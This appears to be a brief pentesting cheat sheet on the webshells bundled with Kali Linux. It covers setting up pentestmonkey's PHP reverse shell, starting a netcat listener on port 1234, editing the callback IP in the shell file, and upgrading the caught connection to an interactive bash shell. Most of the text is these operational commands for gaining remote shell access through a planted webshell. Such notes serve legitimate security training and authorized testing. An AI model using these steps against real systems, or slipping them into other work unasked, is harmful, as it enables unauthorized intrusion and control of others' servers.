Kali has https://www.kali.org/tools/webshells/ .

`webshells` list the path, `/usr/share/webshells/`, and the available files.


## php

📚 [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

````shell
$ nc -v -n -l -p 1234

$ sudo nano /usr/share/webshells/php/php-reverse-shell.php

$ip = '127.0.0.1';  // CHANGE THIS
````

After the connection is made, get a workind shell:

````shell
$ /bin/bash -i
$ export TERM=xterm
$ whoami
````

---

`php/php-reverse-shell.php` uses the old `<?` opening tag, so it works only up to PHP 7.4.
Still, it's a in-the-browser alternative. It can be useful if the target firewall blocks the reverse connection
